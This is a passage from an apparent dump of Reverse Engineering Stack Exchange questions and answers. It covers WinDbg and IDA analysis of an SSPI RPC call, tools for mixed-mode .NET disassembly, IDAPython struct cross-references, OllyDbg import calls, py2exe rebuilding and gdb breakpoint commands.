  const GENERIC_BINDING_ROUTINE_PAIR   *aGenericBindingRoutinePairs;
  const EXPR_EVAL                      *apfnExprEval;
  const XMIT_ROUTINE_QUINTUPLE         *aXmitQuintuple;
  const unsigned char                  *pFormatTypes;
  int                                  fCheckBounds;
  unsigned long                        Version;
  MALLOC_FREE_STRUCT                   *pMallocFreeStruct;
  long                                 MIDLVersion;
  const COMM_FAULT_OFFSETS             *CommFaultOffsets;
  const USER_MARSHAL_ROUTINE_QUADRUPLE *aUserMarshalQuadruple;
  const NDR_NOTIFY_ROUTINE             *NotifyRoutineTable;
  ULONG_PTR                            mFlags;
  const NDR_CS_ROUTINES                *CsRoutineTables;
  void                                 *Reserved4;
  ULONG_PTR                            Reserved5;
} MIDL_STUB_DESC, *PMIDL_STUB_DESC;
</code></pre>

<p>And here is how it looks like in windbg, when i put a breakpoint in the NdrClientCall2 function</p>

<pre><code>0:006&gt; .echo ""Arguments:""; dds esp+4 L5
Arguments:
06d9ece4  74cc2158 SspiCli!sspirpc_StubDesc
06d9ece8  74cc2322 SspiCli!sspirpc__MIDL_ProcFormatString+0x17a
06d9ecec  06d9ed00
06d9ecf0  91640000
06d9ecf4  91640000
0:006&gt; .echo ""PMIDL_STUB_DESC:""; dds poi(esp+4) L20
PMIDL_STUB_DESC:
74cc2158  74cc2690 SspiCli!sspirpc_ServerInfo+0x24
74cc215c  74cca1cd SspiCli!MIDL_user_allocate
74cc2160  74cca1e6 SspiCli!MIDL_user_free
74cc2164  74ce0590 SspiCli!SecpCheckSignatureRoutineRefCount+0x4
74cc2168  00000000
74cc216c  00000000
74cc2170  00000000
74cc2174  00000000
74cc2178  74cc1c52 SspiCli!sspirpc__MIDL_TypeFormatString+0x2
74cc217c  00000001
74cc2180  00060001
74cc2184  00000000
74cc2188  0700022b
74cc218c  00000000
74cc2190  00000000
74cc2194  00000000
74cc2198  00000001
74cc219c  00000000
74cc21a0  00000000
74cc21a4  00000000
74cc21a8  48000000
74cc21ac  00000000
74cc21b0  001c0000
74cc21b4  00000032
74cc21b8  00780008
74cc21bc  41080646
74cc21c0  00000000
74cc21c4  000b0000
74cc21c8  00020004
74cc21cc  00080048
74cc21d0  21500008
74cc21d4  0008000c
0:006&gt; .echo ""PFORMAT_STRING:""; db poi(esp+8)
PFORMAT_STRING:
74cc2322  00 48 00 00 00 00 06 00-4c 00 30 40 00 00 00 00  .H......L.0@....
74cc2332  ec 00 bc 00 47 13 08 47-01 00 01 00 00 00 08 00  ....G..G........
74cc2342  00 00 14 01 0a 01 04 00-6e 00 58 01 08 00 08 00  ........n.X.....
74cc2352  0b 00 0c 00 20 01 0a 01-10 00 f6 00 0a 01 14 00  .... ...........
74cc2362  f6 00 48 00 18 00 08 00-48 00 1c 00 08 00 0b 00  ..H.....H.......
74cc2372  20 00 2c 01 0b 01 24 00-a2 01 0b 00 28 00 b8 01   .,...$.....(...
74cc2382  13 41 2c 00 a2 01 13 20-30 00 f8 01 13 41 34 00  .A,.... 0....A4.
74cc2392  60 01 12 41 38 00 f6 00-50 21 3c 00 08 00 12 21  `..A8...P!&lt;....!
</code></pre>

<p>So how exactly do i figure out what is the remote process it is going to communicate with, or what pipe it is using to communicate?</p>

<p>As far as i understand from the MSDN, it is supposed to call a remote procedure. if i understand that right, it means it should call a remote function as if its an exported dll function. How can i set a breakpoint there?</p>

<p>P.S:</p>

<p>The main reason im posing this function is because the NdrClientCall2 seems to be pretty huge.</p>
","<blockquote>
  <p>So how exactly do i figure out what is the remote process it is going
  to communicate with, or what pipe it is using to communicate?</p>
</blockquote>

<p>The first step is to find the RPC client interface. This can be found via the first argument to <code>NdrClientCall2()</code>, named <code>pStubDescriptor</code>. In your question, <code>pStubDescriptor</code> points to <code>SspiCli!sspirpc_StubDesc</code>:</p>

<blockquote>
  <p>And here is how it looks like in windbg, when i put a breakpoint in
  the NdrClientCall2 function</p>

<pre><code>0:006&gt; .echo ""Arguments:""; dds esp+4 L5
Arguments:
06d9ece4  74cc2158 SspiCli!sspirpc_StubDesc
</code></pre>
</blockquote>

<p><code>SspiCli!sspirpc_StubDesc</code> is a <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa374178(v=vs.85).aspx"" rel=""noreferrer""><code>MIDL_STUB_DESC</code></a>, and on my computer, here are its associated values (via IDA Pro):</p>

<pre><code>struct _MIDL_STUB_DESC const sspirpc_StubDesc MIDL_STUB_DESC
&lt;
    offset dword_22229B8,
    offset SecClientAllocate(x),
    offset MIDL_user_free(x),
    &lt;offset unk_22383F4&gt;,
    0,
    0,
    0,
    0,
    offset word_22224B2,
    1,
    60001h,
    0,
    700022Bh,
    0,
    0,
    0,
    1,
    0,
    0,
    0
&gt;
</code></pre>

<p><a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa374178(v=vs.85).aspx"" rel=""noreferrer"">As documented on MSDN</a>, the first field in the structure above ""points to an RPC client interface structure"". Thus, we can parse the data at that address as an <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa378503(v=vs.85).aspx"" rel=""noreferrer""><code>RPC_CLIENT_INTERFACE</code></a> struct:</p>

<pre><code>stru_22229B8    dd 44h                  ; Length
                dd 4F32ADC8h            ; InterfaceId.SyntaxGUID.Data1
                dw 6052h                ; InterfaceId.SyntaxGUID.Data2
                dw 4A04h                ; InterfaceId.SyntaxGUID.Data3
                db 87h, 1, 29h, 3Ch, 0CFh, 20h, 96h, 0F0h; InterfaceId.SyntaxGUID.Data4
                dw 1                    ; InterfaceId.SyntaxVersion.MajorVersion
                dw 0                    ; InterfaceId.SyntaxVersion.MinorVersion
                dd 8A885D04h            ; TransferSyntax.SyntaxGUID.Data1
                dw 1CEBh                ; TransferSyntax.SyntaxGUID.Data2
                dw 11C9h                ; TransferSyntax.SyntaxGUID.Data3
                db 9Fh, 0E8h, 8, 0, 2Bh, 10h, 48h, 60h; TransferSyntax.SyntaxGUID.Data4
                dw 2                    ; TransferSyntax.SyntaxVersion.MajorVersion
                dw 0                    ; TransferSyntax.SyntaxVersion.MinorVersion
                dd offset RPC_DISPATCH_TABLE const sspirpc_DispatchTable; DispatchTable
                dd 0                    ; RpcProtseqEndpointCount
                dd 0                    ; RpcProtseqEndpoint
                dd 0                    ; Reserved
                dd offset _MIDL_SERVER_INFO_ const sspirpc_ServerInfo; InterpreterInfo
                dd 4000000h             ; Flags
</code></pre>

<p>From the <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa378503(v=vs.85).aspx"" rel=""noreferrer""><code>RPC_CLIENT_INTERFACE</code></a> struct above, we can extract the <code>InterfaceId</code> GUID: <code>4F32ADC8-6052-4A04-8701-293CCF2096F0</code></p>

<p>We can now look up that interface GUID with <a href=""http://www.rpcview.org/"" rel=""noreferrer"">RpcView</a> to find the associated DLL, running process, and endpoints:</p>

<p><img src=""https://i.stack.imgur.com/T4JZp.png"" alt=""Interfaces"">
<img src=""https://i.stack.imgur.com/b1JI5.png"" alt=""Process"">
<img src=""https://i.stack.imgur.com/XRV4Z.png"" alt=""Endpoints""></p>

<p>To find out which specific endpoint is being used by the SSPI RPC server in the LSASS process, we can reverse engineer <code>sspisrv.dll</code>. In the exported function <code>SspiSrvInitialize()</code>, we see the following call:</p>

<pre><code>RpcServerUseProtseqEpW(L""ncalrpc"", 0xAu, L""lsasspirpc"", 0);
</code></pre>

<p>To figure out which specific function is being called in <code>sspisrv.dll</code>, we need to look at the <code>pFormat</code> data passed to <code>NdrClientCall2</code>. In your example code above, the <code>pFormat</code> data is:</p>

<pre><code>00 48 00 00 00 00 06 00-4c 00 30 40 00 00 00 00 ...
</code></pre>

<p>If we parse the <code>pFormat</code> data as an <a href=""http://doxygen.reactos.org/d5/d5b/structNDR__PROC__HEADER__RPC.html"" rel=""noreferrer"">NDR_PROC_HEADER_RPC</a> structure, we get:</p>

<pre><code>handle_type = 0x00
Oi_flags    = 0x48
rpc_flags   = 0x00000000
proc_num    = 0x0006
stack_size  = 0x004C
</code></pre>

<p>From <code>proc_num</code>, we can see that this RPC call is calling the 6th RPC function in <code>sspisrv.dll</code>. We can use RpcView again to get the address for the 6th RPC function:</p>

<p><img src=""https://i.stack.imgur.com/ihKKv.png"" alt=""Procedures""></p>

<p>And with IDA Pro, we can see the function in <code>sspisrv.dll</code> at address <code>0x7573159D</code>:</p>

<pre><code>.text:7573159D __stdcall SspirProcessSecurityContext(x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x) proc near
</code></pre>

<p>RpcView also shows us a decompilation of that function's prototype:</p>

<p><img src=""https://i.stack.imgur.com/yP5dk.png"" alt=""Decompilation""></p>

<p>(Note that on your computer, the 6th function might not be at virtual address <code>0x7573159D</code>, and furthermore, the 6th function might not be <code>SspirProcessSecurityContext()</code>, but this is the approach you would use nonetheless.)</p>

<p>As such, we can now say the following:</p>

<ul>
<li>The RPC server code for your <code>NdrClientCall2()</code> call is in <code>sspisrv.dll</code></li>
<li>The RPC server for your <code>NdrClientCall2()</code> call is running in LSASS's process</li>
<li>The endpoint for your <code>NdrClientCall2()</code> call is named <code>lsasspirpc</code></li>
<li>The RPC server function called by your <code>NdrClientCall2()</code> call in <code>sspisrv.dll</code> is <code>SspirProcessSecurityContext()</code></li>
</ul>
","8118"
"Does learning Metasploit help me in reverse engineering and malware analysis?","1304","","<p>I learned basis of assembly language with, both, AT&amp;T and Intel style. After that I gone through buffer overflow and how to use shellcode with it. Should I go for <a href=""http://www.metasploit.com/"" rel=""nofollow"">Metasploit</a> now?</p>
","<p>Nope. Metasploit is a pentester framework, not a reversing/malware-dev framework. Instead, you should master a debugger (<a href=""https://www.hex-rays.com/products/ida/debugger/"">IDA</a>, <a href=""http://radare.org/y/"">Radare2</a>, <a href=""http://www.ollydbg.de/"">OllyDbg</a>, etc) and at least one scripting language (<a href=""http://www.python.org/"">Python</a> or <a href=""http://www.ruby-lang.org/"">Ruby</a>).</p>
","3381"
"Where can I get reliable tools for RE?","1294","","<p>I am looking for a reliable source to download RE tools such as:</p>

<ol>
<li>Lordpe</li>
<li>Imprec</li>
<li>Peid</li>
</ol>

<p>but it seems all the links in google are not safe, where can I buy or download it from a reliable not malwared source. Can I trust <a href=""http://www.woodmann.com/"">http://www.woodmann.com/</a> ?</p>
","<p>Tools archived on <a href=""http://www.woodmann.com/"">http://www.woodmann.com/</a> should be safe.</p>

<p>I've personally met and trust most of the people who run the site (Woodmann, dELTA, etc.), and can vouch for their integrity.</p>
","2429"
"How to retrieve native asm code from .NET mixed mode dll file?","1292","","<p>This is seriously one question I couldn't find the answer to anywhere on Google.com</p>

<p>When I mean mixed mode I mean .NET application which has unmanaged and managed code together.</p>

<p>I used tools
.NET Reflector 6 that crashes on native methods or shows only signature to them.
Also used dnEditor v0.76 beta which doesn't ever crash but also doesn't show any native x86 assembly for the areas it couldn't decompile.</p>

<p>I get code like this</p>

<pre><code>[SuppressUnmanagedCodeSecurity]
[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
public unsafe static extern byte WritePointer(uint uint_1, void* pVoid_1, int int_4, int int_5, __arglist);
</code></pre>

<p>Yet no way to see the x86 assembly for this method.</p>

<p>I thought about injecting this dll file to a application then attaching ollydbg to it so I could dump the dll file and check it out in IDA PRO but this also doesn't work.</p>

<p>IDA PRO 6.8 by default doesn't even load mixed .NET programs as both .NET IL Code and decompilable native asm..</p>

<p>I ran out of options here, I'll try getting a real dll file and nopping it out somewhere in the middle and pasting the binary there maybe this way IDA PRO would detect it as a unmanaged dll file.</p>

<p>But ya I ask you any tools to achieve this?</p>
","<p>The Linked Dll's native method is here you can load the dll directly in ollydbg too to find a resolved disassembly of the native method </p>

<p><strong>E:\1dll>ls -l 1.dll</strong></p>

<pre><code>-rwxr-xr-x    1 Admin    Administ   268288 Dec 24 15:27 1.dll
</code></pre>

<p><strong>E:\1dll>rahash2 -a md5 1.dll</strong></p>

<pre><code>1.dll: 0x00000000-0x000417ff md5: 82eab591d8bc6d293a2a07f10a5f6a46
</code></pre>

<p><strong>E:\1dll>""c:\Program Files\Microsoft SDKs\Windows\v7.0A\bin\ildasm.exe"" /text 1.dll | grep -i global.*writepointer -B 3</strong></p>

<pre><code>  // Embedded native code
  // Disassembly of native methods is not supported.
  //  Managed TargetRVA = 0x00005B20
} // end of global method WritePointer
</code></pre>

<p><strong>E:\1dll>radare2 -qc ""s 0x5b20-0x1000+0x400;af;pdf;"" 1.dll</strong></p>

<pre><code>/ (fcn) fcn.00004f20 135
|          0x00004f20    51             push ecx
|          0x00004f21    53             push ebx
|          0x00004f22    55             push ebp
|          0x00004f23    56             push esi
|          0x00004f24    8b742414       mov esi, dword [esp + 0x14]     ; [0x14:4]=0
|          0x00004f28    57             push edi
|          0x00004f29    8d442424       lea eax, [esp + 0x24]           ; 0x24  ; '$'
|          0x00004f2d    6a04           push 4
|          0x00004f2f    83c004         add eax, 4
|          0x00004f32    56             push esi
|          0x00004f33    33db           xor ebx, ebx
|          0x00004f35    89442418       mov dword [esp + 0x18], eax     ; [0x18:4]=64
|          0x00004f39    e83c5a0000     call 0xa97a ;0x0000a97a(unk, unk, unk, unk, unk, unk, unk) ; fcn.0000550c+21614
</code></pre>

<p>radare2 doesn't seem to load the dll properly as an image but seems to load it as a raw file (as in hexeditor view)
ollydbg will load the dll and will disassemble properly 
radare2 disassembly above and ollydbg disassembly below for the 
embedded native method WritePointer </p>

<pre><code>CPU Disasm
Address   Hex dump         Command                                  Comments
10005B20  /.  51           PUSH    ECX
10005B21  |.  53           PUSH    EBX                              ; Jump to mscoree._CorDllMain
10005B22  |.  55           PUSH    EBP
10005B23  |.  56           PUSH    ESI
10005B24  |.  8B7424 14    MOV     ESI, DWORD PTR SS:[ESP+14]
10005B28  |.  57           PUSH    EDI
10005B29  |.  8D4424 24    LEA     EAX, [ESP+24]
10005B2D  |.  6A 04        PUSH    4                                ; /Size = 4
10005B2F  |.  83C0 04      ADD     EAX, 4                           ; |
10005B32  |.  56           PUSH    ESI                              ; |Addr = 13F8B8
10005B33  |.  33DB         XOR     EBX, EBX                         ; |
10005B35  |.  894424 18    MOV     DWORD PTR SS:[ESP+18], EAX       ; |
10005B39  |.  E8 3C5A0000  CALL    &lt;JMP.&amp;KERNEL32.IsBadReadPtr&gt;     ; \KERNEL32.IsBadReadPtr
</code></pre>

<p>regarding your pastebin </p>

<p>here is the pseudo code for the function without inside loop</p>

<p><strong>radare2 -c ""s 0x5cb0-0x1000+0x400;af;pdc;"" 1.dll</strong></p>

<pre><code>function fcn.000050b0 () {
    loc_0x50b0:    
    push ecx
    push ebx
    push ebp
    push esi
    esi = dword [esp + 0x14]
    push edi
    eax = [esp + 0x1c]
    push 4
    eax += 4
    push esi
    ebx = 0
    dword [esp + 0x18] = eax
    0xa97a ()
    if (eax == eax
    notZero 0x5106) {
        loc_0x5106:    
        eax = dword [ebx]
        pop edi
        pop esi
        pop ebp
        dword [esp + 4] = 0
        pop ebx
        pop ecx

        loc_0x50d2:    
        ebp = dword [esp + 0x1c]
        esi = dword [esi]
        edi = 0
        if (ebp == ebp
        isLessOrEqual 0x5106)
      }
      return;
}
</code></pre>
","11622"
"Lifting up binaries of any arch into an intermediate language for static analysis","1290","","<h2>Background</h2>

<p>As the title is self-explanatory, I would like to translate binaries of any architecture (e.g. x86, ARM, ARM Thumb) to an intermediate language in order to apply arch-independent static analysis.</p>

<p>To be exact, my work is confined to the shared objects supplied in APK files for Android platform. My basic requirements, which I would expect the IL to meet, is as follows (Actually my goal is to extract information flows from a given <code>.so</code> file supplied in an APK file).</p>

<ul>
<li>Binary slicing</li>
<li>PDG (CFG/DFG)</li>
<li>Well-supported by its maintainer or its community</li>
</ul>

<p>For this purpose I've looked into some existing tools listed below, but unfortunately I'm not sure whether I can use them to reveal information flows or not.</p>

<ul>
<li><a href=""https://github.com/Cr4sh/openreil"">OpenREIL</a>: The aim of this project is to lift up arch-dependent binaries into REIL.</li>
<li><a href=""https://github.com/programa-stic/barf-project"">Barf Project</a>: A multiplatform open source Binary Analysis and Reverse engineering Framework</li>
<li><a href=""http://www.capstone-engine.org"">Capstone</a>: A disassembly framework.</li>
<li>Epic: This tool translates binaries of any-arch to arch-independent LLVM bitcode. (This project is not public, so I cannot use it.)</li>
</ul>

<h2>Question</h2>

<p>Is there any IL out there that I use to statically analyze a arch-dependent <code>.so</code> file (within an APK archive) in order to extract information flows? Basically I want it to provide basic requirements such as slicing and PDG.</p>
","<p>My recommendation is to use libVEX, as it's the most robust intermediate code library that I know of. It's part of Valgrind and supports a load of <a href=""http://valgrind.org/info/platforms.html"" rel=""nofollow"">architectures</a>. You can either use libVEX in a C/C++ program or, alternatively, use the Python bindings called <a href=""https://github.com/angr/pyvex"" rel=""nofollow"">PyVex</a>.</p>

<p>In any case: consider that most of the things you want to do must be implemented from scratch. Everything but translation of assembly ""dialects"" to an intermediate representation, I would say. Or, perhaps, you can use some parts of the <a href=""https://github.com/angr/angr"" rel=""nofollow"">Angr Project</a>. I haven't tested it myself.</p>

<p>Good luck!</p>
","13298"
"How to get cross-references to a struct type in IDA by IDAPython and add comments to variables of the struct type","1288","","<p>I'm writing an IDA plugin using idapython in order to add comments (located in database) to variables of struct types. In order to do this, firstly, i need to get the list of cross-references to a given structure type (e.g. struct BITMAPINFO) which can be found in ""Structure"" subview in IDA. </p>

<p>I know IDA provides this function from version 6.2 by right-button mouse clicking on the structure name and selecting ""List cross references to"". A window like the following will be popped-up:</p>

<p><a href=""https://i.stack.imgur.com/CBI7A.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CBI7A.png"" alt=""example: xrefs to BITMAPINFO picture""></a></p>

<p>Each item of the list in above picture is either an address where a global variable of type %structure name% (here is BITMAPINFO) is declared or a position where a local variable of type ""structure name"" is defined. The former is like</p>

<p><a href=""https://i.stack.imgur.com/KxBT2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KxBT2.png"" alt=""example: global variable definition of type GUID""></a>
(here is type GUID, not BITMAPINFO).</p>

<p>The latter is like
<a href=""https://i.stack.imgur.com/McC7c.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/McC7c.png"" alt=""example: local variable definition of type BITMAPINFO""></a>
This is the position where IDA declare local variables based on its identified type.</p>

<p>I wonder if there is a way to get these data by IDAPython.</p>

<p>NOTE: This is different from cross-references to a(ll) member(s) of a struct type, which can be got by right-button mouse clicking on the structure member name, shown as the following</p>

<p><a href=""https://i.stack.imgur.com/XIcJe.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XIcJe.png"" alt=""example: XrefsTo GUID.DATA1""></a></p>

<p>Before asking here, i do it like:</p>

<pre><code>#CODE 1
ea = idc.LocByName(%structure name%)  

frm = [x.frm for x in idautils.XrefsTo(ea)]
</code></pre>

<p>I think i have got the whole list of cross-references to %structure name% using my above code. However, i found many EAs in the list seem like ineffective such as '0xff0052c9' (<b>MaxEA is 0x108f800</b>). However, i guess my code has got the desired result because the length of returned list is equal to the number of items in the list shown as the 1st picture. But i can't explain the result especially the (seemingly) ineffective ones. Also, when i add comments to the addresses in the list using the following code</p>

<pre><code>#CODE 2
for ea in xrefs_list:
    # each cross-reference to the given struc type

    if repeatable:
        # add repeatable comment 'cmt' at address 'ea'
        idc.MakeRptCmt(ea, cmt)

    else:
        # add comment  'cmt' at address 'ea'
        idc.MakeComm(ea, cmt)
</code></pre>

<p>i found i only added comments to the effective addresses which are between <b>idc.MinEA()</b> and <b>idc.MaxEA()</b>, and these addresses are places where global instances of the queried struct type are declared, as shown in the 2nd picture.</p>

<p>My questions are:</p>

<blockquote>
  <ol>
  <li>Is my above code (CODE 1) correct to get all cross-references to a struct type?
  If it is, how to explain those seemingly ineffective addresses (above 0xFF000000)</li>
  <li>How to add comments to other cross-reference addresses other than the references to global instances of the struct type? </li>
  </ol>
</blockquote>
","<h2>Stack Variable References</h2>

<p>The xrefs you are showing are xrefs from stack variables. As you mentioned, when trying to get the xrefs to the struct, you get two types of results:</p>

<ol>
<li>Valid addresses, which are struct instances in the data section</li>
<li><code>0xFF000000</code> and above addresses, where the struct is used as a stack variable.</li>
</ol>

<p>In IDA the stack variables for a function are represented internally as a struct, with each stack variable a member of that struct.</p>

<blockquote>
  <p>idaman struc_t *ida_export get_frame(const func_t *pfn);</p>
</blockquote>

<p><a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/frame_8hpp.html#a538eae24587b7931ea67d9d110d68193"" rel=""nofollow"">Docs link</a></p>

<p>Knowing that, we can infer that the weird xrefs are member-ids (which they are). To get the names of the containing structs we use <code>fullname = idaapi.get_member_fullname(mid)</code> and get something like <code>$ F4014B0.var_14</code>.
<code>$ F4014B0</code> is the netnode name of the stack-frame struct for the function at <code>0xF4014B0</code>.</p>

<pre><code>import idc
import idaapi
import idautils

sid = idc.GetStrucIdByName('my-struct-name')
for xref in idautils.XrefsTo(sid):
    if 0xFF000000 &gt; xref.frm:
        # The struct is used as data
        print 'Data xref from 0x{:X}'.format(xref.frm)
    else:
        # The struct is used as a stack variable.
        mid = xref.frm
        fullname = idaapi.get_member_fullname(mid)
        function_ea = int(fullname[2:].split('.')[0], 0x10)
        print 'Stack xref from 0x{:X}'.format(function_ea)
</code></pre>

<h2>Getting Xrefs to member Variables</h2>

<p>(This is here because it was my initial answer, and it contains valuable information.)</p>

<p>You were really close to the solution. Your code gives you the <code>sid</code>, so you only get references to the struct itself. What you need, is references to the different members, and this can be done using the <code>mid</code>. You can get it using fully-qualified member names. However, since there are many members to every struct, enumerating them is usually a better choice.</p>

<pre><code>import idc
import idautils

def get_member_ids(sid):
    offset = 0
    while offset != 0xFFFFFFFF:
        mid = idc.GetMemberId(sid, offset)
        if mid != -1:
            yield mid
        offset = idc.GetStrucNextOff(sid, offset)


def get_member_xrefs(struc_name):
    sid = idc.GetStrucIdByName(struc_name)
    for mid in get_member_ids(sid):
        for xref in idautils.XrefsTo(mid):
            yield xref.frm


# And the usage:
for xref in get_member_xrefs('my-struct-name'):
    print '0x{:X}'.format(xref)
</code></pre>

<p><strong><em>edit to answer question in comment</em></strong></p>

<h2>A Bit on Netnodes</h2>

<p>This next bit is about IDA internals, so I might be off mark here. I am basic the information on SDK docs <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/netnode_8hpp.html"" rel=""nofollow"">see here</a></p>

<p>As visible in my code, many APIs that are documented for use on effective addresses (<code>ea</code>s) also work on other IDA primitives - struct ids, member ids - without any difference.</p>

<p>Internally, objects in IDA are mapped to netnodes. Lines in IDA are mapped linearly to netnode numbers, While other objects are mapped to numbers starting at <code>0xFF000000</code>. 
While addresses and struct ids might have a different semantic meaning, they are both netnode numbers. In IDA's APIs, this means that they are treated the same way.</p>

<p>I hope this makes things clearer.</p>
","12799"
"Cannot call function (properly) in ollydbg","1283","","<p>I need some help regarding calls in assembly with Ollydbg.
I'm messing around with a simple application.
So far, so good, I created a codecave for myself to add some code.</p>

<p>But whenever I try to create a call to a function outside my debugged executable module to, for example, a <code>kernel32</code> or <code>msvcrt</code> function, it messes everything up.</p>

<p>Let's look at some random call in the application:</p>

<pre><code>0041D654     FF15 DC714200  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetCommandLineA&gt;]
</code></pre>

<p>When I double click it, it shows me <code>CALL DWORD PTR DS:[4271DC]</code>
So, <code>4271DC</code> seems to point to <code>76FB496D</code>, which is, indeed:</p>

<pre><code>76FB496D &gt;-FF25 60070177    JMP DWORD PTR DS:[&lt;&amp;api-ms-win-core-processenvironment-l1-2-0.Get&gt; ;KERNELBA.GetCommandLineA
</code></pre>

<p>Well, I just stole that from the application itself.
Now I want to create a call to <code>kernel32</code> myself.
I assemble a line and enter <code>CALL DWORD PTR DS:[Kernel32.GetCommandLineA]</code>
Now it's saying:</p>

<pre><code>0041D654     FF15 6D49FB76  CALL DWORD PTR DS:[KERNEL32.GetCommandLineA]
</code></pre>

<p>Looking good!</p>

<p>Assemble the line <code>CALL DWORD PTR DS:[76FB496D]</code>. Giving this a run works fine ofcourse, but whenever I run it like this on another pc, all hell breaks loose.</p>

<p>My question is: How can I make such an pointer <code>CALL DWORD PTR DS:[4271DC]</code>, so the code runs on all pc's?</p>

<p>I can of course use <code>CALL DWORD PTR DS:[4271DC]</code> in the application to call the function <code>getcomandlineA</code> whenever I want, but I don't know the (dynamic?) pointer to, let's say, <code>kernel32.lstrcpy</code>.</p>
","<p>The address at 004271DC is resolved at the application start via the executable Imports. Those addresses are different for every executable. The address where the module and functions are loaded (here 76FB496D) is also not guaranteed to always stay the same so you shouldn't hardcode them.  </p>

<p>A generic method to call a function in any executable is to dynamically import it with LoadLibrary and GetProcAddress as described here : <a href=""https://stackoverflow.com/questions/8696653/dynamically-load-a-function-from-a-dll"">https://stackoverflow.com/questions/8696653/dynamically-load-a-function-from-a-dll</a></p>
","3377"
"Re-engineering to create UML Diagrams from Source and Binary","1281","","<p>Are there tools that would create:  </p>

<ul>
<li>UML Structural Diagrams from Source Code.  </li>
<li>UML Behavioral Diagrams from Binary executing on a arm / x86 system.<br>
  Sources would be in C &amp;/ C++ &amp;/ Python.</li>
</ul>

<p>Such tools would boost productivity while re-engineering (understanding existing software and modifying it.) on a Linux platform.</p>
","<p>I did some work on modelling C programs sometimes back, I used this article as starting point,</p>

<p><a href=""http://www.drdobbs.com/uml-for-c-programmers/184401948"" rel=""nofollow"">http://www.drdobbs.com/uml-for-c-programmers/184401948</a></p>

<p>then evaluated few ide and found EA most fitting also IBM RSA has good support for modelling C programs. </p>

<p>However what you will need to do is, formulate a way of modelling C programs in UML and then follow it, this is because C not being an Object Oriented language and UML being inherently Object oriented we need to device how we will represent a C construct in UML.</p>

<p>hope this helps for C, for C++ EA and <a href=""http://www.ibm.com/developerworks/downloads/r/architect/"" rel=""nofollow"">RSA</a>'s reverse engineering worsk well and not much effort is required as C.</p>
","3812"
"Finding function name of caller function","1277","","<p>Function ""Bob"" calls function ""Janice"". Currently, I'm at an address in function ""Janice"" and can easily do idc.GetFunctionName(ea) to get the name Janice. However, I also want to get the caller function Bob's name. How would I go about doing this efficiently considering I'm currently within function Janice? Thanks.</p>
","<p>Generally speaking this question as it asked is a bit ambiguous.
The answer can be divided by 2 general parts, getting a caller in the debug session and determining the potential caller list during static analysis.</p>

<p><strong>Getting a potential caller list during static analysis</strong></p>

<p>As @blabb wrote in most cases it is possible and can be done with IDA scripting capabilities.</p>

<p>Here is IDAPython example which will print all references to the callee (which is equivalent to press <kbd>x</kbd> on the callee name in IDA) assuming that your cursor is within the ""Janice"" function:</p>

<pre><code>    import idautils
    import idc
    print ""Code references""
    for ref in idautils.CodeRefsTo(idc.GetFunctionAttr(idc.ScreenEA(), idc.FUNCATTR_START), 1):
           print ref
    print ""Data references""
    for ref in idautils.DataRefsTo(idc.GetFunctionAttr(idc.ScreenEA(), idc.FUNCATTR_START)):
           print ref
</code></pre>

<p>Of course demangling should be applied to get a more human-readable name as @blabb wrote if needed.</p>

<p>It should be taken in account that this script (exactly as the pressing <kbd>x</kbd> on the callee) does not solve the indirect call issue, but shows all references to the function which may help to trace the indirect call.</p>

<p><strong>Getting a specific caller during a debug session</strong></p>

<p>This is a bit trickier and much more architecture dependent (for example in ARM you have LR register with return address which will help you in most cases if you stopped at the start of ""Janice"" function and it is not contaminated yet), you'll need to</p>

<ul>
<li>Stop in the ""Janice"" function on the breakpoint</li>
<li>Determine the placement of return address</li>
<li>Conclude the specific caller from it</li>
</ul>

<p>The script which will do it is a bit more complex and unfortunately I have no time to debug it for now, 
so I'll just list the IDAPython APIs which will probably help you to solve the problem:</p>

<pre><code>idaapi.get_func(ea) # get the function object of func_t type
idaapi.get_frame(pfn) #gets the function frame structure of struc_t type
idaapi.frame_off_retaddr(pfn) # AFAIK gets the offset of return address of the structure
</code></pre>
","13083"
"Modify py2exe packed executable","1264","","<p>I have an application in Python compiled with py2exe.
I have successfully extracted python scripts using Py2ExeDumper converted to <code>.py</code> using Easy Python Decompiler.</p>

<p>I made some modification to the python code and recompiled <code>.py</code> files to <code>.pyc</code> files.</p>

<p>Question : How can I rebuild the exe file using the new edited <code>.pyc</code> files ?</p>

<p>Thanks</p>
","<p>Instead of trying to rebuild the EXE from the <code>.pyc</code> files, you can just use py2exe to build a new EXE from the modified <code>.py</code> files.</p>

<p>Alternatively, if you really want to <em>replace</em> the library in the original EXE, you would need to extract the EXE's <code>PYTHONSCRIPT</code> resource with a resource editor, un-marshal the array of code objects, replace the code object of your choosing in the array, re-marshal the array of code objects, and replace the <code>PYTHONSCRIPT</code> resource data with this new marshaled stream. You can look at <code>_create_script_data</code> in <a href=""http://sourceforge.net/p/py2exe/svn/HEAD/tree/trunk/py2exe-3/py2exe/runtime.py"" rel=""nofollow"">http://sourceforge.net/p/py2exe/svn/HEAD/tree/trunk/py2exe-3/py2exe/runtime.py</a> for more details.</p>
","6762"
"Run command on breakpoint without stopping","1263","","<p>I'd like to automate the following in my <code>.gdbinit</code>:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes

# When execution stops at the above breakpoint,
# I want to display the contents of `rcx` as a string:
x/s $rcx
c  # do not stop here
</code></pre>

<p>How do I automate this?</p>

<h3>UPDATE: Here's a better <code>.gdbinit</code> example:</h3>

<pre><code># Our custom-built libcurl, with debugging symbols enabled:
set environment LD_PRELOAD=./curl/curl-7.34.0/lib/.libs/libcurl.so

# File that connects to the evil server:
file ./evil

# Make sure we get notified when it connects!
break curl_easy_setopt
commands $bpnum
clear curl_easy_setopt  # to avoid recursion
call curl_easy_setopt(curl, CURLOPT_VERBOSE)
continue
end
</code></pre>

<p>This hooks in to the evil binary, and when it initialises its curl handle, we set set it to verbose so we get lots of output about what's going on.</p>

<p>Thanks for the answer.</p>
